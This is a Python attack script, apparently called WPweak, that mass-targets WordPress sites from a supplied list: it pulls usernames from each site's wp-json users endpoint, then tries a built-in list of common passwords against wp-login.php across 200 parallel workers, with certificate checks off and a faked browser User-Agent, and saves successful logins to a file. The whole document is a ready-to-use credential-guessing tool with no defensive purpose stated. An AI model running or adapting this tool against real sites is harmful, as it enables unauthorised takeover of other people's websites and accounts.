import requests, os, colorama, platform, multiprocessing
from colorama import Fore
from platform import system
from multiprocessing import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if system() == 'Linux':
    os.system('clear')
else:
    os.system('cls')

print(f"""{Fore.YELLOW}
 __        ______                     _    
 \ \      / /  _ \__      _____  __ _| | __
  \ \ /\ / /| |_) \ \ /\ / / _ \/ _` | |/ /
   \ V  V / |  __/ \ V  V /  __/ (_| |   < {Fore.WHITE} (c) Rafaeyfa1337{Fore.YELLOW}
    \_/\_/  |_|     \_/\_/ \___|\__,_|_|\_\ {Fore.WHITE} WordPress Weak Password (auto get username from wp-json)\n""")

listmega = input("Website list (eg: list.txt): ")
# username list: https://pastebin.com/raw/HSK1vGKH
# password list: https://pastebin.com/raw/jiVFDYzq
usernamelist = ["admin", "user", "administrator", "adminwp", "wordpress", "wpadmin", "wp", "webmaster", "admin1", "admin2", "admin3", "admin4", "admin5", "admin6", "admin7", "admin8", "admin9", "admin10", "adm", "root", "manager"]
passwordlist = ["password", "pass", "pass123", "admin123", "admin12345", "12345", "rahasia", "bismillah", "12345", "123456", "1234567", "12345678", "123456789", "admin@123", "admin@12345"]

def grabuser(url):
    try:
        userjos = requests.get(f'http://{url}/wp-json/wp/v2/users', timeout=10, verify=False)
        if userjos.status_code == 200:
            return [user['slug'] for user in userjos.json()]
    except requests.RequestException as e:
        print(f"{url}: {e}")
    return []

def wpweakpass(url):
    userfrjson = grabuser(url)
    try:
        for username in userfrjson + usernamelist:
            for password in passwordlist:
                r = requests.post(f'http://{url}/wp-login.php', data={'log': username, 'pwd': password}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}, timeout=10, allow_redirects=True, verify=False)
                r2 = requests.post(f'https://{url}/wp-login.php', data={'log': username, 'pwd': password}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}, timeout=10, allow_redirects=True, verify=False)
                if '#wpadminbar' in r.text or 'confirm_admin' in r.text or 'wp-admin/post.php' in r.text:
                    print(f'{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {url}{Fore.YELLOW} | {Fore.GREEN}{username}{Fore.YELLOW}:{Fore.GREEN}{password}')
                    with open('result_wp.txt', 'a') as output:
                        output.write(f'http://{url}/wp-login.php | Username: {username} | Password: {password}\n')
                    return True
                elif '#wpadminbar' in r2.text or 'confirm_admin' in r2.text or 'wp-admin/post.php' in r2.text:
                    print(f'{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {url}{Fore.YELLOW} | {Fore.GREEN}{username}{Fore.YELLOW}:{Fore.GREEN}{password}')
                    with open('result_wp.txt', 'a') as output:
                        output.write(f'https://{url}/wp-login.php | Username: {username} | Password: {password}\n')
                    return True
                else:
                    print(f'{Fore.WHITE}[{Fore.YELLOW}-{Fore.WHITE}] {url}{Fore.YELLOW} | {Fore.RED}{username}{Fore.YELLOW}:{Fore.RED}{password}')
    except:
        pass

def main():
    with open(listmega, 'r') as f:
        urls = [line.strip('\n') for line in f.readlines()]
        with Pool(200) as pool:
            pool.map(wpweakpass, urls)
    print(f"\n{Fore.WHITE}DONE BRO! Result yang berhasil login disimpan pada file result_wp.txt!")

if __name__ == '__main__':
    main()
